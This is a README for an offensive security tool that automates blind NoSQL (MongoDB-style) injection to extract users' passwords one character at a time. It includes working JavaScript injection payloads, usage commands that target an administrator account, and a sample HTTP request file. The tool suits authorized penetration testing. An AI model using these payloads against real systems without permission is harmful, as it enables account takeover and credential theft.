# 🔐 NoSQL PassTerminator

*Automated Blind NoSQL Injection Password Cracker*
By **0xTensai**

---

### 📌 Description

**NoSQL PassTerminator** is a blind injection tool designed to extract passwords from NoSQL-based web apps (typically MongoDB-style injections). It automates the detection of password length and performs character-by-character guessing using time-efficient multithreading.

---

### 🧪 Injection Strategy

It uses JavaScript-based injection such as:

```javascript
' && this.password[0] == 'a' || 'a'=='b
```

---

### ✅ Features

* 🔍 Blind password length detection
* 🧠 Smart multithreaded brute-force logic
* 📦 Takes raw HTTP request files (Burp-style)
* 🎯 Fail-string or raw response comparison modes
* 🧾 Save cracked passwords to file
* 🔡 Custom charset and casing options

---

### ⚙️ Requirements

* Python 3.x
* `requests`
  Install with:

```bash
pip install requests
```

---

### 🚀 Usage

```bash
python3 nosql.py -r request.req -p user -n administrator -f "user not found"
```

Or with response comparison:

```bash
python3 nosql.py -r request.req -p user -n administrator --compare-mode
```

---

### 🧾 Arguments

| Flag                  | Description                                                                 |
| --------------------- | --------------------------------------------------------------------------- |
| `-r`, `--request`     | Path to raw HTTP request file (Burp format)                                 |
| `-p`, `--param`       | Name of the POST parameter to inject (e.g., `user`)                         |
| `-n`, `--username`    | Username value to attack (e.g., `administrator`)                            |
| `-f`, `--fail-string` | Failure message shown on incorrect guess (not needed with `--compare-mode`) |
| `--compare-mode`      | Use response difference instead of fail-string                              |
| `--max-length`        | Max password length to try (default: `30`)                                  |
| `-o`, `--output`      | Save cracked password to a file                                             |

---

### 💡 Charset Selection (Interactive Prompt)

During execution, you will be prompted to choose:

**Character set:**

* `1` → Alphabets only
* `2` → Alphabets + Numbers
* `3` → Alphabets + Numbers + Special Characters

**Casing:**

* `1` → Lowercase
* `2` → Uppercase
* `3` → Both

---

### 🔍 Sample Injection Payload

```http
user=admin' && this.password[2] == 'm' || 'a'=='b
```

---

### 📥 Example `.req` File Format

```http
POST /user/lookup HTTP/1.1
Host: vulnerable.site
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

user=admin
```

---

### ✅ Example Run

```bash
python3 nosql.py -r login.req -p user -n administrator -f "user not found"
```

---

### ⚠️ Disclaimer

This tool is for **educational purposes** and **authorized testing only**.
Do **not** use it on targets you do not own or have permission to assess.

---

### 👨‍💻 Author

**🧠 0xTensai** — Offensive security, automation, and tool development.
